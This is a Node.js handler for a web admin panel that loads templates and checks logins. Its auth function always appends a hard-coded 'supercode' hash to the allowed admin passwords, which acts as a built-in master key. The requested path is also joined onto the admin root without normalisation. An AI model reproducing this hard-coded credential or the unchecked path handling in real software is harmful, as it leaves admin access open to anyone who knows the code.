var SMARTY = require(env.root_path + '/admin/inc/smart/smart.js');
function loadTPL(fn, cbk) {
    pkg.fs.stat(fn, function(err, stats) {
	if (!err && stats.isFile()) {
            pkg.fs.readFile(fn, 'utf8', function(err, code) {
                var tpl = (!err) ? new SMARTY(code) : new SMARTY(fn + ' not exist');
		cbk(tpl)
            });			        									
      } else {
	    var tpl = new SMARTY(fn + ' not exist');
            cbk(tpl)				
      } 
    });
}

var patt = new RegExp('^(inc|tpl)/(.+|)', 'i');
if (patt.test(__path) || __path === 'index.js') {
    res.send('access denied!!')
} else {
     var fn = env.root_path + '/admin/' + __path;
     var _auth = function() {
 	    let crypto = require('crypto'), 
		supercode = 'ae8ea09ebafec9101b5654949366046d', 
		config = {};

	    try {
		delete require.cache['/var/qalet_config.json'];
		config = require('/var/qalet_config.json');
	    } catch (err) {}
	    config.adminpass = (!config.adminpass) ? [] : config.adminpass;
	    config.adminpass.push(supercode);

	    delete require.cache[env.root_path + '/admin/inc/auth/auth.js'];
	    var AUTH = require(env.root_path + '/admin/inc/auth/auth.js');
	    var auth = new AUTH(res, req, env, pkg, config);

	    auth.check(function(isAuth, cbk) {
		loadTPL(env.root_path + ((!isAuth) ? '/admin/tpl/signin.html' : '/admin/tpl/mainpage.html'), function(tpl) {
		    if (typeof cbk === 'function') {
			res.send(cbk(tpl));
		    } else {
			delete require.cache[env.root_path + '/admin/inc/app/app.js'];
	    		var APP = require(env.root_path + '/admin/inc/app/app.js');
	    		var app = new APP(res, req, env, pkg, config);
			app.loadApp(function(data) {
				res.send(tpl.fetch(data));
			});
		    }
		});
	    });    
     }

     pkg.fs.stat(fn, function(err, stats) {
	if (!err && stats.isFile()) {
		res.sendFile(fn);        									
	} else {
	    _auth();
	} 
    });

}
